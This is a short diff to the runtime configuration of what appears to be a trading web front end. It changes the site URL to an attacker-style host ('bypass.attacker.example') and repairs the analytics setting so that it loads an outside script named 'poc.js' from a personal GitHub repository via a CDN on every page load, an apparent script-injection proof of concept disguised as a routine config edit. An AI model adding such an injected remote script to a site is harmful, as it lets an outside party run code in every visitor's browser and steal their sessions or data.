@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://example.com.com",
+  "VITE_SEO_SITE_URL": "https://bypass.attacker.example",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script src=\"<script src=\"https://cdn.jsdelivr.net/gh/ricard0xf/poc123@main/poc.js\"></script>",
+  "VITE_ANALYTICS_SCRIPT": "<script src=\"https://cdn.jsdelivr.net/gh/ricard0xf/poc123@main/poc.js\"></script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
